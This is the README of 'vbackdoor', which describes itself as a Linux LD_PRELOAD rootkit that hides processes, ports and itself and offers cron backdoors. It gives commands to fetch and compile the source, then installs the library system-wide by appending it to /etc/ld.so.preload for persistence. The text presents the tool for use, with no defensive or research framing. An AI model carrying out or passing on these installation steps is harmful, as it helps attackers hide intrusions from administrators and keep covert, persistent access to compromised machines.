# vbackdoor
[中文](https://github.com/veo/vbackdoor/blob/main/README_cn.md)

Hide a process,port,self under Linux using the linux LD_PRELOAD rootkit.

### compile the library

```
git clone https://github.com/veo/vbackdoor.git
cd vbackdoor
vi vbackdoor.c
make
sudo mv vbackdoor.so /usr/local/lib/
```

or

```
wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
vi vbackdoor.c
gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
sudo mv vbackdoor.so /usr/local/lib/
```

### Load it with the global dynamic linker

```
echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
```




  * Process hiding
  * LD_PRELOAD hiding
  * Network hiding
  * cron Backdoors